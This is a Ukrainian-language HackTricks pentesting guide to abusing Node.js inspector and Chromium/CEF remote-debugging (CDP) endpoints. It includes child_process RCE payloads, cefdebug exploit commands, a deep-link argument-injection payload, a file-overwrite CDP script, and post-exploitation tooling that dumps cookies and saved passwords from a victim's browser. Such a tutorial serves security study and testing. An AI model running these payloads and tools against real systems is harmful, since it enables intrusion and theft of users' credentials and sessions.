# Зловживання Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

Історичні практичні приклади включають покроковий розбір Multimaster і атаку на debugger Visual Studio Code через CVE-2019-1414; використовуйте їх як контекст для конкретних версій, а не припускайте, що всі актуальні цілі Electron або Chromium мають ті самі примітиви.<sup>[[1]](#references)[[3]](#references)</sup>

## Основна інформація

[З документації](https://nodejs.org/learn/getting-started/debugging): після запуску з параметром `--inspect` процес Node.js очікує на підключення клієнта для налагодження. **За замовчуванням** він прослуховує адресу й порт **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Щоб підключитися, клієнтам Inspector потрібно знати й указати адресу хоста, порт і UUID. Повна URL-адреса матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **debugger має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього порту, потенційно зможе виконувати довільний код від імені процесу Node.js (**потенційне підвищення привілеїв**).<sup>[[4]](#references)</sup>

Є кілька способів запустити Inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Коли ви запускаєте процес для інспектування, з’явиться приблизно таке:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Процеси на основі **CEF** (**Chromium Embedded Framework**) можуть відкрити налагоджувач за допомогою `--remote-debugging-port=9222`. Це надає доступ до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), а не через інспектор Node.js, тому payload-и на основі `process` у Node.js за замовчуванням не застосовуються безпосередньо.<sup>[[2]](#references)[[5]](#references)</sup>

Коли ви запускаєте браузер у режимі налагодження, з’явиться щось подібне:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Перелік і керування кінцевою точкою CDP

HTTP-ендпойнти виявлення розрізняють WebSocket **браузера** та WebSocket окремих **target** (вкладка, worker, розширення тощо). Зверніться до `/json/version`, щоб отримати кінцеву точку браузера, і до `/json/list`, щоб отримати список target; повернутими значеннями `webSocketDebuggerUrl` можна керувати безпосередньо за допомогою повідомлень CDP, подібних до JSON-RPC.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Наприклад, підключіться за допомогою `websocat "$BROWSER_WS"` і надішліть `{"id":1,"method":"Target.getTargets"}` або `{"id":2,"method":"Storage.getCookies"}`. На цілі сторінки (`websocat "$PAGE_WS"`) `Runtime.evaluate` виконується в цьому renderer, а `Page.captureScreenshot` повертає скриншот у кодуванні base64. `document.cookie` не може розкрити cookies із прапорцем `HttpOnly`, тоді як `Storage.getCookies` запитує сховище cookies браузера.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Браузери, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у веббраузері, можуть надсилати запити WebSocket і HTTP відповідно до моделі безпеки браузера. **Початкове HTTP-з’єднання** необхідне, щоб **отримати унікальний ідентифікатор сесії debugger**. **Same-origin policy** **не дозволяє** вебсайтам встановлювати **це HTTP-з’єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, чи в заголовках **'Host'** для з’єднання вказано **IP-адресу** або саме **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Цей **захід безпеки запобігає використанню inspector** для виконання коду шляхом **простого надсилання HTTP-запиту** (що можна було б зробити, скориставшись вразливістю SSRF).<sup>[[4]](#references)</sup>

### Запуск inspector у запущених процесах

Можна надіслати **сигнал SIGUSR1** запущеному процесу nodejs, щоб **запустити inspector** на порту за замовчуванням. Однак для цього потрібні достатні привілеї, тож це може надати вам **привілейований доступ до інформації всередині процесу**, але не призведе до прямого підвищення привілеїв.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Це корисно в контейнерах, оскільки **завершити процес і запустити новий** з `--inspect` **неможливо**, адже **контейнер** буде **знищено** разом із процесом.<sup>[[6]](#references)</sup>

### Підключення до inspector/debugger

Щоб підключитися до браузера на базі **Chromium**, можна відкрити URL `chrome://inspect` або `edge://inspect` для Chrome чи Edge відповідно. Натиснувши кнопку Configure, переконайтеся, що **цільовий хост і порт** правильно вказані. На зображенні показано приклад Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Після цього з’явиться URL для доступу до debugger, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Підключення до inspector/debugger: щоб підключитися до браузера на базі Chromium, ...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити інспектори**, запущені локально, і **впроваджувати в них код**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Зверніть увагу: **експлойти NodeJS RCE не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно переглянути API, щоб знайти цікаві способи його використання).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE в налагоджувачі/інспекторі NodeJS

> [!TIP]
> Якщо ви шукаєте, як отримати [**RCE через XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Поширений спосіб отримати **RCE**, маючи змогу **підключитися** до інспектора Node, — використати щось на кшталт (схоже, це **не працюватиме під час підключення через Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads протоколу Chrome DevTools

Перевірити API можна тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
У цьому розділі я просто перелічу цікаві прийоми, які, як я бачив, використовували для експлуатації цього протоколу.

### Обмеження для профілю за замовчуванням у Chrome 136+

Починаючи з **Chrome 136**, Chrome ігнорує `--remote-debugging-port` і `--remote-debugging-pipe`, якщо вони вказують на **каталог даних Chrome за замовчуванням**. Цей параметр потрібно поєднувати з нестандартним `--user-data-dir`. Окремий ключ шифрування та ізольований стан браузера в цьому каталозі не дають простому прийому з прапорцем отримати доступ до звичайного автентифікованого профілю користувача. Не слід вважати, що це обмеження Chrome поширюється на старіші збірки Chrome, Chrome for Testing, застосунки Electron/CEF або інші похідні від Chromium без перевірки.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Тому сам факт, що поточний процес Chrome запущено лише з параметром `--remote-debugging-port`, **не** доводить, що CDP активувався. Перевірте наявність слухача та `/json/version`, а також визначте, який саме профіль його обслуговує.<sup>[[14]](#references)</sup>

### Ін’єкція параметрів через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) фахівці Rhino Security виявили, що застосунок на базі CEF **зареєстрував власну URI-адресу** в системі (workspaces://index.html), яка отримувала повний URI, а потім **запускала застосунок на базі CEF** з конфігурацією, яку частково формували з цього URI.<sup>[[8]](#references)</sup>

Було виявлено, що параметри URI декодувалися з URL-кодування та використовувалися для запуску базового застосунку CEF, що дозволяло користувачу **ін’єктувати** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні команди.<sup>[[8]](#references)</sup>

Отже, payload на кшталт:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Виконає calc.exe.<sup>[[8]](#references)</sup>

### Перезапис файлів

Змініть папку, у яку **зберігатимуться завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **вихідний код** застосунку своїм **шкідливим кодом**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE та ексфільтрація

STAR Labs показала, що відкриті служби WebDriver/CDP можуть дозволити довільне читання файлів і RCE; у деяких конфігураціях ланцюжок експлуатації можна завершити за допомогою DNS rebinding.<sup>[[9]](#references)</sup>

Служба WebDriver у ChromeDriver відрізняється від Chrome DevTools/CDP. Її capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) визначає виконуваний файл браузера, який запускається для нової сесії. Якщо непривілейований користувач може звернутися до служби ChromeDriver, запущеної від root, і створити сесію із вказаним ним шляхом до виконуваного файла, такий запуск може перетнути межу привілеїв служби. Порожня відповідь `/sessions` не доводить, що створювати нові сесії неможливо. Перш ніж робити висновки про можливість використання цього шляху, перевірте власника процесу, фактичну доступність listener-а, авторизацію сесій, доступ до виконуваного файла та механізми ізоляції; самої назви процесу чи типового порту недостатньо. [Рекомендації Google з безпеки](https://developer.chrome.com/docs/chromedriver/security-considerations) радять запускати ChromeDriver від непривілейованого облікового запису. Пасивне перерахування не повинно створювати сесію WebDriver.

Історичні приклади з автоматизації браузера та безпеки Chromium див. у матеріалі Counter WebDriver і звітах Project Zero 773, 1742 та 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Увімкнення CDP у запущеному процесі Chromium

Обмеження Chrome для профілю за замовчуванням блокує лише активацію через командний рядок. Маючи достатній доступ того самого користувача для керування процесом браузера, оригінальний [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) і [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) для Cobalt Strike викликають невиведену назовні функцію Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` у вже запущеному `chrome.exe` або `msedge.exe`. Тому кінцева точка належить справжньому профілю та зберігає його вкладки, розширення, cookies і автентифікований стан.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Для звичайних 64-бітних процесів Chrome/Edge BOF знаходить вікно браузера та завантажений `chrome.dll`/`msedge.dll`, шукає в remote PE сигнатури з масками, виділяє пам’ять для stub-ів і блока контексту, тимчасово замінює процедуру вікна та виконує фінальний виклик у **UI-потоці** браузера. Потрібні під час виконання компоненти: `StartRemoteDebuggingServer`, `operator new` у Chromium, `TCPServerSocketFactory::CreateForHttpServer` і vtable фабрики. Виконання припиняється, якщо для будь-якої обов’язкової сигнатури не знайдено рівно одного збігу.<sup>[[15]](#references)[[16]](#references)</sup>

BOF приймає режим браузера та необов’язковий порт. Після цього допоміжний скрипт може перевірити кінцеву точку й зібрати cookies; `chrome-iso` — це окремий спосіб обійти межу Windows Process Isolation у Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Шлях `chrome-iso` використовує лише дескриптори із правами, обмеженими запитами, для доступу до ізольованого процесу. Він визначає встановлений `chrome.dll`, розмір PE-образу якого збігається з розміром образу активного процесу, знаходить символи в цьому локальному образі та використовує диспетчеризацію Chromium `WindowImpl` разом із синхронним `WM_COPYDATA` і наявним хуком User32 в образі, щоб звернутися до потоку UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Це техніка **маніпуляції процесом браузера після компрометації**, а не обхід автентифікації в мережі. Вона залежить від версії збірки, оскільки відповідні символи C++ не експортуються і можуть змінюватися після оновлення браузера.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Оновлення сигнатур після оновлень браузера

Використовуйте точну версію `chrome.dll` або `msedge.dll`, встановлену на цільовій системі, та відповідний їй PDB. `symchk.exe` з Windows SDK завантажує символи; далі скрипти репозиторію знаходять `StartRemoteDebuggingServer`, визначають вхідні дані алокатора/фабрики сокетів або перевіряють усі сигнатури, вбудовані в BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Результат із нульовою або множинною кількістю збігів не можна замінювати довільною адресою. Якщо відомий шаблон `operator new` або `CreateForHttpServer` надто змінився, щоб створити на його основі нову маску, скористайтеся `pe_signature_finder.py` разом із PDB, щоб перевірити цей символ і знайти послідовність байтів, унікальну для цільового модуля.<sup>[[16]](#references)[[18]](#references)</sup>

#### Вилучення даних через автентифікований браузер за допомогою CDP Toolkit

Ця техніка не розшифровує App-Bound Encryption (ABE) офлайн і не обходить прив’язку до пристрою. Натомість вона використовує легітимний браузер як **oracle розшифрування та проксі для автентифікованої взаємодії**: `Storage.getCookies` запитує в активного браузера його сховище cookie, тоді як робочі процеси навігації та запису скринкастів забезпечують обробку запитів, сховища, корпоративної автентифікації та прив’язаної до пристрою поведінки в наявному браузері жертви.<sup>[[17]](#references)[[18]](#references)</sup>

Після маршрутизації loopback-слухача CDP через pivot оператора, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) можна використовувати для перелічення та збору поширених артефактів.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` і `tabs screenshot` — це переважно обгортки для `/json/version`, списку цілей, `Storage.getCookies` і `Page.captureScreenshot`. Для доступу до історії, закладок, розширень і метаданих паролів потрібна тимчасова ціль WebUI `chrome://`/`edge://`: toolkit чекає, поки інтерфейс завантажиться, перевіряє його модель або DOM, збирає результат і закриває ціль.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` іде далі: відкриває реальне джерело збереженого логіна, фокусує поле облікових даних, вибирає нативну підказку автозаповнення за допомогою подій введення CDP і зчитує заповнені значення. Джерело/порт/шлях мають точно відповідати області збереженого пароля; видимий режим — надійний варіант за замовчуванням, оскільки спливне вікно підказки є нативним елементом інтерфейсу браузера.<sup>[[17]](#references)[[18]](#references)</sup>

Для взаємодії в реальному часі `browser-takeover screencast` транслює кадри та надсилає введення до реальної цілі (зокрема у фоновому режимі або поза екраном). Натомість `browser-takeover proxy` локально приймає HTTP і HTTPS `CONNECT`, а запити до upstream надсилає через приховані цілі Chrome, використовуючи фонові вкладки, якщо приховані цілі недоступні. Це зберігає мережевий контекст і контекст автентифікації жертви, але менш точно відтворює роботу складних клієнтських застосунків, оскільки браузер оператора відображає отриманий вміст.<sup>[[17]](#references)[[18]](#references)</sup>

Для виявлення не покладайтеся лише на телеметрію командного рядка `--remote-debugging-*`: також зіставляйте незвичні дескриптори й операції з пам’яттю процесів браузера (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, створення потоків), ін’єкцію DLL і несподівані сокети loopback, що прослуховуються процесами Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

У реальному середовищі й **після компрометації** ПК користувача, який використовує браузер на основі Chromium, історично застосовували такий прийом: перезапустити браузер із увімкненим debugging і перенаправити порт loopback. Це може відкрити стан браузера жертви у продуктах/збірках, які досі приймають вибраний профіль, але Chrome 136+ не застосує цей спосіб до стандартного каталогу даних.<sup>[[7]](#references)[[14]](#references)</sup>

Початкову команду перезапуску наведено нижче для старіших/залежних від версії цілей. Друга команда — підтримуваний варіант для поточного Chrome, але вона створює ізольований профіль замість повторного відкриття звичайного автентифікованого стану жертви.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Для специфічних для macOS методів повторного запуску Chromium, роботи з розширеннями та CDP див. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - інструмент для перевірки та exploitation налагоджувача CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: віддалене виконання коду у Visual Studio Code через налагоджувач Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник із налагодження Node.js — Початок роботи](https://nodejs.org/learn/getting-started/debugging)
- [5] [Протокол Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Звіт corCTF 2021 — saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: зловживання функцією налагодження Chrome для віддаленого спостереження за сеансами перегляду та керування ними](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: віддалене виконання коду в AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Ти зі мною говориш? RCE через WebDriver за допомогою DNS rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Протидія WebDriver — від бота до RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Проблема 773 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Проблема 1742 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Проблема 1944 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Зміни перемикачів віддаленого налагодження для підвищення безпеки — Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Впровадження CDP у запущений браузер Edge: детальний огляд інструментування браузера під час виконання](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps — повернення Cookie Monster: крадіжка cookie через Chrome DevTools Protocol](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
